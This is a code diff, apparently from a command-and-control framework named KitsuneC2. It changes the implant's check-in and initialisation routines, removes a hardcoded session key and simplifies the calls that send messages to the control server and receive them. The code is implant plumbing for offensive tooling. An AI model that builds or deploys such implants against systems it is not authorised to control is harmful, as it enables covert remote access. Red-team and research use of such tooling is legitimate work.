@@ -3,6 +3,7 @@ package main
 import (
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/lib/cryptography"
+	"fmt"
 	"math"
 	"math/rand"
 	"net"
@@ -26,7 +27,6 @@ const (
 
 var (
 	implantId       string = "00000000000000000000000000000000" //dynamically generated based on unique host features
-	sessionKey      string = "thisis32bitlongpassphraseimusing" //TODO: dynamically generate on each message to provide PFS.
 	shouldTerminate bool   = false
 )
 
@@ -70,8 +70,9 @@ func initialize() error {
 		return err
 	}
 	defer conn.Close()
-	err = SendEnvelopeToServer(conn, implantId, 0, msg, []byte(sessionKey))
+	err = SendEnvelopeToServer(conn, 0, msg)
 	if err != nil {
+		fmt.Println(err)
 		return err
 	}
 	return nil
@@ -81,12 +82,12 @@ func initialize() error {
 func checkIn(conn net.Conn) (int, interface{}, error) {
 	msg := communication.ImplantCheckin{ImplantId: implantId}
 
-	err := SendEnvelopeToServer(conn, implantId, 1, msg, []byte(sessionKey))
+	err := SendEnvelopeToServer(conn, 1, msg)
 	if err != nil {
 		return -1, nil, err
 	}
 
-	messageType, data, err := ReceiveEnvelopeFromServer(conn, []byte(sessionKey))
+	messageType, data, err := ReceiveEnvelopeFromServer(conn)
 	if err != nil {
 		return -1, nil, err
 	}
